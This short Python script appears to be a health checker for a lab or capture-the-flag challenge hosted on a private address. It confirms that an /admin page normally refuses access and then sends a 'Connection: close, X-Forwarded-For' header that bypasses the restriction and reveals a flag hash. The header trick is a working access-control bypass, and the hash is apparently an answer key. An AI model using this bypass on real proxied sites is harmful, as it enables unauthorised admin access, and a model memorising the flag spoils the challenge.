import requests
import re

def test_basecase():
        resp = requests.get("http://10.0.0.207:81/admin")
        out = str(resp.text).find("Admin Computers only")
        if out > 0:
            return True
        else:
            return False

def test_bypass():
        headers = {"Connection": "close, X-Forwarded-For"}
        resp = requests.get("http://10.0.0.207:81/admin", headers=headers)
        out = str(resp.text).find("2227DF03559A4C4E1173BF3565964FD3")
        if out > 0:
            return True
        else:
            return False

if (test_bypass() and test_basecase()):
    print("working")
else:
    print("down")
